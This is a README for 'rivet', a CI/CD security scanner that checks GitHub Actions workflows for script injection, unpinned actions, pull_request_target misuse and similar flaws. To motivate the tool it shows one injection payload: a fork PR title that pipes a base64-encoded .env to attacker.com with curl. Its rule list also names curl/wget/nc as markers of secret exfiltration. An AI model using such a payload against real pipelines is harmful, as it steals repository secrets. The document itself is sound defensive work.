# rivet

> **Status: v1.0.0, early development.** This is a prototype. The rule set and
> output formats work and are tested, but the tool is not production-hardened
> yet. Expect rough edges, false positives, and breaking changes before 1.1.

**CI/CD security that doesn't need a 40-page report to be useful**

rivet reads `.github/workflows/*.yml`, runs ten security rules against them, and answers one question: *can this workflow be stolen from?* It exits `0` when the answer is no, `2` when it is, and `1` when it could not finish the audit. That's the whole contract. CI gates love it, jq loves it, and you can read the output without a legend.

## Why does this exist?

Because I got tired of reviewing CI pipelines by hand.

GitHub Actions is the most common CI/CD system in the world, and it is routinely misconfigured in ways that lead to full repository compromise. A fork PR titled `"; curl attacker.com/exfil?data=$(cat .env | base64) #` runs that command on a runner with every secret in the environment. An action pinned to `@v3` ships whatever the upstream repo serves today — including after a compromise. `pull_request_target` plus a checkout step is arbitrary code execution against the base repo.

The tooling to catch this is fragmented. `actionlint` catches syntax errors. `zizmor` is excellent but opinionated. GitHub's own code scanning is limited. None of them are built for auditing dozens of repos in a row, gating CI on findings, or feeding an ASPM pipeline.

rivet is the command I wanted: one run, one answer, exit code you can gate on.

## What it does

- Parses workflows into a normalized model, then runs ten pure rules (R01–R10)
- Prints severity-colored findings with `file:line` anchors, plain-English explanations, and a concrete fix for each
- Emits bare-array JSON for `jq`, code scanning, or whatever you pipe into
- Gates CI: `--fail-on high` exits `2` when anything at that severity or above exists
- Previews fixes with `--fix-dry` — and never writes, because no write path exists

## Install

```bash
cargo build --release
# or
cargo install rivet        # once it's on crates.io
```

Pre-built binaries for Linux, macOS, and Windows are on the [releases page](https://github.com/yourpwnguy/rivet/releases).

## Usage

```bash
rivet --path ./myrepo                 # audit one repo
rivet --path ./repos --recursive      # audit many, per-repo table
rivet --path . -o json | jq '.[] | select(.severity=="high")'
rivet --path . --fail-on high -q      # CI gate, exit code only
rivet --path . --fix-dry              # show patches, write nothing
```

### Exit codes

| Code | Meaning |
|------|---------|
| `0` | Pass — nothing at or above the `--fail-on` threshold (default: `high`) |
| `2` | Policy breach — a finding at or above the threshold exists |
| `1` | System error — unreadable path, unparseable workflow, malformed `rivet.yaml` |

`2` beats `1`: if we found critical issues, that's the headline even when some file also failed to parse. An unparseable workflow is a system error, not a pass — unknown is not safe.

### Options

| Flag | Description |
|------|-------------|
| `--path <PATH>` | Repo or directory to scan (default: `.`) |
| `--recursive` | Descend into subdirectories looking for `.github/workflows` |
| `--fail-on <SEV>` | `critical`, `high` (default), `medium`, `low`, `info` |
| `-o, --format <F>` | `text` (default), `json`, `table` |
| `-q, --quiet` | No output; exit code only |
| `--no-color` | No ANSI (also: `NO_COLOR`, `TERM=dumb`, non-TTY) |
| `--repo-visibility <V>` | `public` / `private` / `unknown` — gates the self-hosted rule |
| `--fix-dry` | Preview patches without writing |

## The rules

| ID | Severity | Catches |
|----|----------|---------|
| `script-injection` | CRITICAL | `run:` steps interpolating untrusted event context (`github.event.issue.title`, `github.event.pull_request.body`, `github.actor`, …) into shell |
| `pull-request-target` | HIGH / INFO | `pull_request_target` checking out PR head code; metadata-only usage downgrades to INFO |
| `unpinned-action` | HIGH / MEDIUM | `uses:` on a branch HEAD or mutable tag instead of a full commit SHA |
| `overly-broad-permissions` | HIGH | Missing `permissions:` block, `write-all`, `id-token: write` with no OIDC use case, grants beyond the `rivet.yaml` ceiling |
| `secret-exfiltration` | HIGH | `${{ secrets.* }}` inside a `run:` step, especially next to `curl`/`wget`/`nc` |
| `self-hosted-runner` | MEDIUM | `runs-on: self-hosted` in a repo declared public |
| `fork-secrets` | MEDIUM | `secrets.*` in `on: pull_request` workflows — fork runs get no secrets |
| `reusable-workflow-pin` | LOW | Reusable workflows called with a mutable ref |
| `debug-logging` | INFO | `ACTIONS_STEP_DEBUG: true` in `pull_request_target` with no `::add-mask::` |
| `artifact-poisoning` | MEDIUM | `workflow_run` downloading artifacts without SHA validation |

## Example output

```
rivet · 4 workflows · 14 jobs · 6ms
────────────────────────────────────────────────────────────────

✗ CRITICAL script-injection .github/workflows/pr.yml:9
  │ run step interpolates untrusted context `github.event.issue.title`
  │ Event fields like issue titles are fully attacker-controlled…
  └ fix: Bind the value to an env var, then reference it

✗ HIGH pull-request-target .github/workflows/build.yml:7
  │ pull_request_target workflow checks out PR head
  │ pull_request_target runs with the base repo's secrets…
  └ fix: Remove the checkout step, or switch the trigger to `pull_request`

────────────────────────────────────────────────────────────────
1 critical · 3 high · 2 medium · 6ms
```

## Configuration

An optional `rivet.yaml` at the scan root for the two things rivet cannot infer locally:

```yaml
repo_visibility: public       # public | private | unknown

permissions:
  granted_max:                 # the most each permission may be granted here
    contents: read
```

Anything granted beyond `granted_max` is flagged.

## Suppressing findings

rivet errs toward flagging, so accepted risk gets a comment — on the finding's line or the one directly above it:

```yaml
- uses: actions/checkout@v3 # rivet:ignore unpinned-action
```

## How it works

Two crates, one direction: the CLI does I/O, the core does everything else.

```
crates/core (rivet-core)   pure analysis — model, parse, rules, engine
crates/cli (rivet)         binary — argv, filesystem, rendering, exit codes
```

The core performs no I/O. Rules are pure functions behind a `Rule` trait, so a new rule is one file and one registry line. Findings are self-contained (what, where, why, fix), so rendering never re-derives domain knowledge. Output is deterministically sorted — stable snapshots, stable CI diffs.

## Development

```bash
just check        # test + clippy + fmt
just test         # 85 tests: unit, fixtures, fuzz, end-to-end
just bench        # parse / evaluate / corpus
just dogfood      # rivet auditing its own workflows
```

## Current limitations

These are scope decisions, not bugs:

- **No expression evaluation.** rivet pattern-matches `${{ }}` syntax. A context hidden in a ternary (`${{ cond && github.event.x || 'safe' }}`) may slip past.
- **No action source analysis.** rivet checks that refs are pinned, not what the pinned code does.
- **No OIDC trust audit.** `id-token: write` is flagged when no OIDC input exists; the AWS/GCP/Azure role trust relationship is out of scope.
- **No hardcoded-secret scanning.** rivet catches *usage patterns* of `${{ secrets.* }}` that lead to exfiltration. Finding `password: hunter2` in YAML is TruffleHog's job.
- **No GitHub API.** Everything is local file parsing. Cross-referencing repo visibility, runner groups, and branch protection is a v2 idea.
- **Not `actionlint`.** rivet does not validate schema, expression syntax, or action inputs. Layer it on top of actionlint, not instead of it.
- **False positives happen.** The tool would rather flag a safe pattern than miss a dangerous one. That's what `# rivet:ignore` is for.

## Why "rivet"?

A rivet is a permanent fastener — the thing that holds CI together. Also: short, memorable, and the point is that supply chains shouldn't be held together with duct tape.

## License

MIT
